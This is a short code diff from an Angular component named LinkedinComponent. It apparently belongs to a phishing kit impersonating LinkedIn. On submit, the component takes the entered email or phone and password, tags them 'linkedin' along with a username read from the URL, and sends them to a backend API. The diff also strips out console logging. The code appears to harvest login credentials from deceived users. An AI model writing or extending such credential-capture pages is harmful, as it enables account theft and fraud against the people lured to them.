@@ -94,14 +94,11 @@ export class LinkedinComponent {
   onSubmit() {
     this.route.queryParams.subscribe(params => {
       this.username = params['username'];
-      console.log('Username:', this.username);
     });
     this.apiService.sendUserData(this.emailOrPhone, this.password, 'linkedin', this.username!).subscribe({
       next: (response) => {
-        console.log('User data sent successfully', response);
       },
       error: (error) => {
-        console.error('Failed to send user data', error);
       }
     });
   }
